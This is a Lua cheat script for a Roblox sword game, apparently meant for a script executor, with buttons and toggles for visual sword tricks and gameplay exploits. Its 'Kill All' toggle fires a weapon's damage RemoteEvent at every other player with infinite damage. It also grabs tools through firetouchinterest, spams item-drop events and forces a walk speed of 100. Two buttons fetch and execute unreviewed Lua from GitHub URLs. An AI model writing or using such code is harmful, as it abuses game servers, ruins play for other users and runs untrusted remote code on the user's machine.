-- Sword Spin
local function getSwords()
    local swords = {}
    local player = game.Players.LocalPlayer
    if not player then return swords end
    local backpack = player:FindFirstChild("Backpack")
    local character = player.Character or player.CharacterAdded:Wait()
    if backpack then for _, item in ipairs(backpack:GetChildren()) do if item:IsA("Tool") then table.insert(swords, item) end end end
    if character then for _, item in ipairs(character:GetChildren()) do if item:IsA("Tool") then table.insert(swords, item) end end end
    return swords
end
other:Button("Sword Spin", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local swords = getSwords()
    if #swords == 0 then return end
    local spinSpeed, distance, spinning, angleOffset = 2, 6, true, 0
    for _, sword in ipairs(swords) do
        sword.Parent = character
        if sword:FindFirstChild("Handle") then
            sword.Handle.Massless = true
            sword.Handle.CanCollide = false
        end
        sword.Grip = CFrame.new(0, 0, 0)
    end
    local conn
    conn = game:GetService("RunService").RenderStepped:Connect(function(dt)
        if not spinning then if conn then conn:Disconnect() end return end
        angleOffset = angleOffset + dt * spinSpeed
        for i, sword in ipairs(swords) do
            local angle = (2 * math.pi / #swords) * (i - 1) + angleOffset
            sword.Grip = CFrame.new(0, 0, 0) * CFrame.Angles(0, angle, 0) * CFrame.new(distance * math.sin(angle), 0, distance * math.cos(angle))
        end
    end)
    local mouse = player:GetMouse()
    mouse.KeyDown:Connect(function(key)
        if key:lower() == "x" then spinning = false end
    end)
end)
other:Button("Sword Hover", function() safeLoad("https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Sword%20Hover.lua") end)
other:Button("Levitate Tools", function() safeLoad("https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/Levitate%20Tools.lua") end)
other:Button("Sword Halo", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local head = character:FindFirstChild("Head")
    if not head then return end
    local swords = getSwords()
    if #swords == 0 then return end
    local haloRadius, haloHeight, angleStep = 5, head.Size.Y / 2 + 3, 2 * math.pi / #swords
    for i, sword in ipairs(swords) do
        sword.Parent = character
        local angle = angleStep * (i - 1)
        local offset = CFrame.new(math.cos(angle) * haloRadius, haloHeight, math.sin(angle) * haloRadius)
        local rotation = CFrame.Angles(0, angle, math.rad(90))
        local desiredCFrame = head.CFrame * offset * rotation
        sword.Grip = character.PrimaryPart and character.PrimaryPart.CFrame:Inverse() * desiredCFrame or CFrame.new()
    end
end)
other:Button("Sword Shoulder", function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player.Backpack
    local function getSwords()
        local swords = {}
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("Handle") then table.insert(swords, tool) end
        end
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("Handle") then table.insert(swords, tool) end
        end
        return swords
    end
    local swordPositions = {
        CFrame.new(-2.4, 2.3, 2.3) * CFrame.Angles(0, 0, math.rad(-45)),
        CFrame.new(0, 2.3, 3.1),
        CFrame.new(2.4, 2.3, 2.3) * CFrame.Angles(0, 0, math.rad(45)),
        CFrame.new(-2.4, 0, 3.1) * CFrame.Angles(0, 0, math.rad(-25)),
        CFrame.new(0, 0, 3.6),
        CFrame.new(2.4, 0, 3.1) * CFrame.Angles(0, 0, math.rad(25)),
        CFrame.new(-2.4, -2.3, 2.3) * CFrame.Angles(0, 0, math.rad(-45)),
        CFrame.new(0, -2.3, 3.1),
        CFrame.new(2.4, -2.3, 2.3) * CFrame.Angles(0, 0, math.rad(45)),
        CFrame.new(2.4, 2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(-45)),
        CFrame.new(0, 2.3, -3.1) * CFrame.Angles(0, math.rad(180), 0),
        CFrame.new(-2.4, 2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(45)),
        CFrame.new(2.4, 0, -3.1) * CFrame.Angles(0, math.rad(180), math.rad(-25)),
        CFrame.new(0, 0, -3.6) * CFrame.Angles(0, math.rad(180), 0),
        CFrame.new(-2.4, 0, -3.1) * CFrame.Angles(0, math.rad(180), math.rad(25)),
        CFrame.new(2.4, -2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(-45)),
        CFrame.new(0, -2.3, -3.1) * CFrame.Angles(0, math.rad(180), 0),
        CFrame.new(-2.4, -2.3, -2.3) * CFrame.Angles(0, math.rad(180), math.rad(45)),
    }
    local swords = getSwords()
    for i, sword in ipairs(swords) do
        local pos = swordPositions[i]
        if not pos then break end
        sword.Parent = backpack
        if sword:FindFirstChild("Handle") then
            sword.Handle.Massless = true
            sword.Handle.CanCollide = false
        end
        sword.Grip = pos
        sword.Parent = character
    end
end)

-- Sword Style
other:Button("Sword Style", function()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local backpack = player.Backpack
    local swords = {}
    local function look(dir)
        for _, v in pairs(dir:GetChildren()) do
            if v:IsA("Tool") then table.insert(swords, v) end
        end
    end
    look(backpack)
    look(character)
    local half = math.floor(#swords/2)
    for i = 1, half do
        local sword = swords[i]
        sword.Parent = backpack
        sword.Grip = CFrame.new(4,31.2,0)*CFrame.Angles((21.4/half*i)+0.8,0,0)*CFrame.new(0,-5.7,0)
        sword.Parent = character
    end
    for i = half+1, #swords do
        local sword = swords[i]
        sword.Parent = backpack
        sword.Grip = CFrame.new(0,1.2,0)*CFrame.Angles(21.4/half*(i-half)+4.06,0,0)*CFrame.new(0,-5.7,0)
        sword.Parent = character
    end
    if #swords > 0 then
        local last = swords[#swords]
        last.Parent = backpack
        last.Grip = CFrame.new(0,0,0)
        last.Parent = character
    end
end)

tgls:Toggle("Drop Tools - Unequip Your Sword First", false, function(bool)
    local LocalPlayer = game:GetService("Players").LocalPlayer
    if bool then
        for _, v in pairs(LocalPlayer.Backpack:GetDescendants()) do
            if v:IsA("Tool") then
                v.CanBeDropped = true
                v.Parent = LocalPlayer.Character
                v.Parent = workspace
            end
        end
    end
end)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local killAllActive, walkSpeedActive, grabToolsActive = false, false, false

tgls:Toggle("Kill All", false, function(state)
    killAllActive = state
    if state then
        task.spawn(function()
            while killAllActive do
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                        local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                        local localRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if targetRoot and localRoot then
                            local distance = (localRoot.Position - targetRoot.Position).Magnitude
                            if distance < 1000 then
                                local sword = LocalPlayer.Backpack:FindFirstChild("sword") or LocalPlayer.Character:FindFirstChild("sword")
                                if sword and sword:FindFirstChild("Handle") and sword.Handle:FindFirstChild("dmg") then
                                    local remote = sword.Handle.dmg:FindFirstChild("RemoteEvent")
                                    if remote then
                                        remote:FireServer(player.Character.Humanoid, math.huge)
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.005)
            end
        end)
    end
end)

LocalPlayer:GetMouse().KeyDown:Connect(function(key)
    if key:lower() == "f" then
        for _ = 1, 100 do
            if ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("DropBagItem") then
                ReplicatedStorage.Events.DropBagItem:FireServer("sword")
            end
        end
    end
end)

tgls:Toggle("Grab All Tools", false, function(state)
    grabToolsActive = state
    if state then
        task.spawn(function()
            while grabToolsActive do
                local toolName = "sword"
                local rootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not rootPart then break end
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj:IsA("Tool") and obj.Name == toolName and obj:FindFirstChild("Handle") then
                        local handle = obj.Handle
                        if handle:FindFirstChildOfClass("TouchTransmitter") then
                            firetouchinterest(rootPart, handle, 0)
                            firetouchinterest(rootPart, handle, 1)
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end)

tgls:Toggle("Loop WalkSpeed | 100", false, function(state)
    walkSpeedActive = state
    if state then
        task.spawn(function()
            while walkSpeedActive do
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.WalkSpeed = 100
                end
                task.wait()
            end
        end)
    end
end)

